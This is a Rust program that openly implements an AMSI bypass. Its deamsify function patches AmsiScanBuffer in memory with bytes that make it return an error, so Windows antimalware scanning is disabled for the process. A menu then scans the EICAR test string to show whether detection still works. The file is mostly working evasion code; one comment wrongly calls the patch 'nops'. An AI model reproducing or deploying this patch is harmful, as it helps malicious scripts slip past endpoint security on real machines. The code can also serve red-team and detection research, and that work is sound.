use std::{ffi::CString, ptr};
use std::io::{self, Write};
use winapi::{
    um::{
    memoryapi::{
        VirtualProtect,
        WriteProcessMemory
    },
    libloaderapi::{
        LoadLibraryA,
        GetProcAddress
    },
    processthreadsapi::GetCurrentProcess, 
    winnt::PAGE_READWRITE
    }, 
    shared::{
        minwindef::{
            DWORD, 
            FALSE
        },
    }
};

fn deamsify() {
    println!("[+] Patching amsi for current process...");

    unsafe {
        // Getting the address of AmsiScanBuffer.
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
        let mut old_permissions: DWORD = 0;
        
        // Overwrite this address with nops.
        if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
            panic!("[-] Failed to change protection.");
        }
        let written: *mut usize = ptr::null_mut();

        if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
            panic!("[-] Failed to overwrite function.");
        }

        // Restoring the permissions.
        VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
        // Spawn the new powershell.
        println!("[+] AmsiScanBuffer patched!");
    }
}


fn amsicheck() {
    let malicious_file = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    //let session = ctx.create_session().unwrap();
    let ctx_prv = amsi::AmsiContext::new("scanner-1.0.0");
    match ctx_prv {
        Ok(_) => {
            let ctx = ctx_prv.unwrap();
            let session_unwrapped = ctx.create_session();
            println!("[+] Context created successfully");
            match session_unwrapped {
                Ok(_) => {

                    // Manejar la sesion correctamente
                    println!("[+] Session created successfully");
                    let session = session_unwrapped.unwrap();
        
                    println!("[+] String: {}", malicious_file);
                
                    match session.scan_string(r"C:\eicar-test.txt", malicious_file) {
                        Ok(result) => {
                            println!("[+] Scanned succesfully: {:?}", result);
                            if result.is_malware() {
                                println!("   [R] This file is malicious!");
                            } else {
                                println!("   [R] Seems to be ok.");
                            }
                        }
                        Err(error) => {
                            eprintln!("   [F] Error reading file : {:?}", error);
                        }
                    }
                }
        
                Err(error) => {
                    println!("Specific error occurred creating AMSI Session: {:?}", error);
        
                }
            }
        }

        Err(error) => {
            println!("Specific error occurred creating AMSI Context: {:?}", error);
        }
    }
    



    
}

fn main() {
    println!("Welcome!");

    loop {
        println!("Please enter your choice. [1] for amsi bypass, [2] for just testing AMSI: ");
        print!("> ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();

        match input.trim() {
            "1" => {
                deamsify();
                amsicheck();
                break;
            }
            "2" => {
                amsicheck();
                break;
            }
            _ => {
                println!("Invalid input. Exiting...");
                break;
            }
        }
    }
    
}